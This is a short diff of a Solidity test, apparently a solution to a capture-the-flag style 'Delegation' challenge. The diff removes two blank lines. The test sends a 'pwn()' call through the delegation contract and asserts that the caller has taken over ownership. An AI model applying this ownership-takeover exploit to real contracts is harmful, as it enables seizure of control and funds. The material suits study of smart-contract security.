@@ -14,12 +14,10 @@ contract AttackerDelegationTest is Test {
 
 
         assertFalse(delegation.owner() == address(this));
-
         (bool success, ) = address(delegation).call(
             abi.encodeWithSignature("pwn()")
         );
         require(success, "Call failed");
-
         assertTrue(delegation.owner() == address(this));
 
     }
